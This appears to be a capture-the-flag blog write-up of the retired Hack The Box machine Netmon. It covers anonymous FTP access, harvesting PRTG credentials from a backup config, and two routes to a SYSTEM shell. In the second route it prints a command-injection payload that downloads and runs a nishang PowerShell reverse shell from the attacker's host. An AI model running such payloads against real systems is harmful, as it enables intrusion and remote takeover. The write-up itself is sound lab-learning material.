---
layout: post
title: "HTB: Netmon"
---

This is a retired Windows box in the Easy category.<!--more-->

<div style="text-align:center"><img src="/assets/Netmon/thumb.jpg" alt="Thumbnail" height="50%" width="50%"/></div><br/>

As with any HTB machine I downloaded the connection pack, fired up openvpn with `ovpn wazza.ovpn` and established my TCP connection to the HTB VPN.
Next, I started out with a basic service discovery scan using nmap with
```
nmap -sV -O -F --version-light 10.10.10.152
```
<div style="text-align:center"><img src="/assets/Netmon/nmap1.png" alt="Nmap Scan"/></div><br/>
Let's do a more in-depth scan and see all the services running.

<div style="text-align:center"><img src="/assets/Netmon/nmap-depth.png" alt="Nmap Scan"/></div><br/>

Let's check if anonymous FTP login is allowed with 
```
ftp 10.10.10.152
```
<div style="text-align:center"><img src="/assets/Netmon/ftp1.png" alt="Nmap Scan"/></div><br/>

Yes! It is! Brilliant, let's get user.txt and try for root.txt.
<div style="text-align:center"><img src="/assets/Netmon/ftp2.png" alt="Nmap Scan"/></div><br/>
Turns out we aren't privileged enough so we'll have to try to escalate them somehow. Hey, atleast we got the user flag quickly :)

On a cursory Google search for the PRTG service on port 80, we encounter this [authenticated remote code execution](https://www.exploit-db.com/exploits/46527). On glancing through it further, we see that one needs to be authenticated and then use the corresponding cookie to run this script. Download it for now, we'll get back to this once we have the credentials. It says that the default credentials are prtgadmin/prtgadmin so let's try that first(duh). Nope, that didn't work. Let's try to find where the credentials for PRTG Network Monitor could be stored. I found this:

<div style="text-align:center"><img src="/assets/Netmon/paessler.png" alt="Nmap Scan"/></div><br/>

Okay, so it says that the creds are usually somewhere in Program Data so let's do an anonymous FTP login and navigate to the directory above.

<div style="text-align:center"><img src="/assets/Netmon/paessler2.png" alt="Nmap Scan"/></div><br/>

Quite a few files here. `PRTG Configuration.old.bak` and `PRTG Configuration.dat` look juicy, so let's grab them onto our local machines.

<div style="text-align:center"><img src="/assets/Netmon/paessler3.png" alt="Nmap Scan"/></div><br/>

Opening up `PRTG Configuration.dat` with gedit(because of it's super easy search feature) and entering `prtgadmin` in it, we find this

<div style="text-align:center"><img src="/assets/Netmon/paessler4.png" alt="Nmap Scan"/></div><br/>

Aha, so the username is still `prtgadmin`! Now we just need to find the password. Let's do the same in `PRTG Configuration.old.bak` (Note: We chose the `.bak` file because these is a file extension used for backup files - so any old credentials may still be in here).

<div style="text-align:center"><img src="/assets/Netmon/paessler5.png" alt="Nmap Scan"/></div><br/>

Lovely, we got the credentials, now let's try to login. Wait what? It's still not working?? But we just found it in the config files!
Yep, yep you did but the box was released in 2019 and since the password is from 2018(we can guess this from the value itself), it mostly(definitely, we checked) won't work in 2019. However, password reuse is a security concern in most public and private organizations these days and that is one of the key takeaways from this box. So change the password appropriately and you should be able to login.

Have Burp running, if not already done, and then capture the cookie that is returned from the server after the login.

<div style="text-align:center"><img src="/assets/Netmon/cookie.png" alt="Cookie"/></div><br/>

Now we have the authentication cookie - we should be able to run the RCE script without any issues. On running this on Linux, you may encounter this error:

```
bash: ./46527.sh: /bin/bash^M: bad interpreter: No such file or directory
```

Do not fear, a simple `sed` command will sort this out.

```
sed -i -e 's/\r$//' 46527.sh
```
Run the command again and you should be faced with this

<div style="text-align:center"><img src="/assets/Netmon/script-run.png" alt="Running the script"/></div><br/>

Run [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and run it as below. Note: Be sure to run this immdiately after you run the previous command since the previous one is time sensitive due to the cookie used.

<div style="text-align:center"><img src="/assets/Netmon/psexec.png" alt="Running the script"/></div><br/>

Awesome, we got root! Now simply navigate to the Desktop and get root.txt!
There's another method to do this. Full disclosure - I found it on Ippsec's walkthrough [here](https://www.youtube.com/watch?v=ZxvgniJXbOo&ab_channel=IppSec).

If you remember, while Googling for PRTG vulnerabilities you'd have seen a few vulns on CVE details. [This one](https://www.cvedetails.com/cve/CVE-2018-9276/) in particular is a vulnerability with a very high rating on 9.0 which states that we can perform command injection by sending malformed parameters in the notifications. Very very interesting and worth trying out.

On trying out the Home->Setup tab, we find nothing of much interest.
<div style="text-align:center"><img src="/assets/Netmon/netmon1.png" alt="Running the script"/></div><br/>

Let's check the one to it's right.
<div style="text-align:center"><img src="/assets/Netmon/netmon2.png" alt="Running the script"/></div><br/>

We might have something here. Probing further we get
<div style="text-align:center"><img src="/assets/Netmon/netmon3.png" alt="Running the script"/></div><br/>

Choose the Wrench on the side menu, scroll down and select the checkbox.
<div style="text-align:center"><img src="/assets/Netmon/netmon4.png" alt="Running the script"/></div><br/>

<div style="text-align:center"><img src="/assets/Netmon/netmon5.png" alt="Running the script"/></div><br/>

Now, two type of executeable file formats are supported by Windows. `.bat` or `.ps`, batch and Powershell files respectively. We need to find out which one will work right off the _bat_(pun intended) and which one won't. Let's try out with a `.bat` file first which executes a simple `ping` command. Now you might be thinking, "Sure wazza, let's run `ping` but ping whom? And how will we know if it's working or not?" I was just coming to that :) We'll setup a `tcpdump` listener to check for incoming packets and direct our `ping` packets to our device(that means your local IP on the HTB vpn network - use `ifconfig` to find it out).

<div style="text-align:center"><img src="/assets/Netmon/netmon6.png" alt="Running the script"/></div><br/>

<div style="text-align:center"><img src="/assets/Netmon/netmon7.png" alt="Running the script"/></div><br/>

Sadly, we see nothing in our console. Next, try to change `.bat` to `.ps`.

<div style="text-align:center"><img src="/assets/Netmon/netmon8.png" alt="Running the script"/></div><br/>

Voila, it's the `.ps` script that runs correctly! Clone nishang if you haven't already from [his Github](https://github.com/samratashok/nishang) and copy the `InvokePowershellTcp.ps1` script into your working directory with `cp`.

Open up the script in the editor of your choice and add the following line at the end

<div style="text-align:center"><img src="/assets/Netmon/netmon9.png" alt="Running the script"/></div><br/>

Next, just setup a python server with the `SimpleHTTPServer` package in your working directory(we plan to tell PRTG to pick up our `InvokePowershellTcp.ps1` file from here) and a `nc` server on port 4444(or any port, but it must be the same as specified in the ps1 script).

Next, use this snippet in the notification params in PRTG.

```
test ; IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')
```

This basically is a Powershell method of downloading a file from a remote server. If you check your python console, you'd see a `GET` request for the powershell file had been made. So now our file is on the server and is being run.

<div style="text-align:center"><img src="/assets/Netmon/netmon10.png" alt="Running the script"/></div><br/>

Check your `nc` console, and you'll see that we now have a root shell!

<div style="text-align:center"><img src="/assets/Netmon/netmon11.png" alt="Running the script"/></div><br/>

This box was actually pretty mindblowing for me - especially the Notifications route by Ippsec. It definitely taught me that probing and poking around is the best way to go. Now, I know, even I didn't quite understand how I'm supposed to know the Powershell way to get a file onto the servr and run it, but that's where Google comes in handy! And of course, not to mention the lesson about password reuse. HTB often teaches us these things in a way that you're sure to remember them for a long time to come!